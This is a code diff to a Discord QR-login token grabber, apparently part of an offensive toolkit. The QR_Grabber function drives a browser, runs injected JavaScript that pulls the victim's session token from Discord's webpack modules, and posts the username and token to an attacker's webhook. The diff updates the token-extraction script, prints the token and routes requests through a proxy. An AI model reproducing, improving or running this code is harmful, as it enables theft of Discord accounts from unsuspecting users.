@@ -17,7 +17,7 @@ from selenium import webdriver
 from bs4 import BeautifulSoup
 from colorama import Fore
 
-from util.plugins.common import getheaders
+from util.plugins.common import getheaders, proxy
 
 def logo_qr():
     #Paste the discord logo onto the QR code
@@ -101,25 +101,18 @@ def QR_Grabber(Webhook):
     while True:
         if discord_login != driver.current_url:
             token = driver.execute_script('''
-    var req = webpackJsonp.push([
-        [], {
-            extra_id: (e, t, r) => e.exports = r
-        },
-        [
-            ["extra_id"]
-        ]
-    ]);
-    for (let e in req.c)
-        if (req.c.hasOwnProperty(e)) {
-            let t = req.c[e].exports;
-            if (t && t.__esModule && t.default)
-                for (let e in t.default) "getToken" === e && (token = t.default.getToken())
-        }
+    token = (webpackChunkdiscord_app.push([
+        [''],
+        {},
+        e=>{m=[];for(
+                let c in e.c)
+                m.push(e.c[c])}
+        ]),m)
+        .find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()
     return token;
                 ''')
-            j = requests.get("https://discordapp.com/api/v9/users/@me", headers=getheaders(token)).json()
+            print(token)
+            j = requests.get("https://discordapp.com/api/v9/users/@me", proxies={"ftp": f'{proxy()}'}, headers=getheaders(token)).json()
             a = j['username'] + "#" + j['discriminator']
             requests.post(Webhook, json = {"content" : f"**Username:** {a}\n**Token:** `{token}`"})
             break
-            sleep(0.5)
-            Hazard.main()
